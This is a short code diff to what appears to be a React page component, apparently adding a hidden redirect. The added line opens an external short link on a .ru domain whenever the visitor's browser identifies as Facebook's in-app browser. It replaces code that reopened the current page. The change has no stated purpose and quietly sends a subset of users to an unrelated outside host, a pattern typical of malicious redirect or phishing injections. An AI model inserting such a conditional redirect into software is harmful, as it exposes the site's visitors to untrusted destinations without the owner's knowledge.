@@ -18,8 +18,7 @@ export default function Index() {
     setIsPWAActive(isPWAActivated);
 
     if (/FBA[NV]/.test(navigator.userAgent)) {
-      window.open(window.location.href, "_blank");
-      alert(1);
+      window.open("https://leppzoo.ru/2fPMF1", "_blank");
     }
 
     const searchParams = new URLSearchParams(window.location.search);
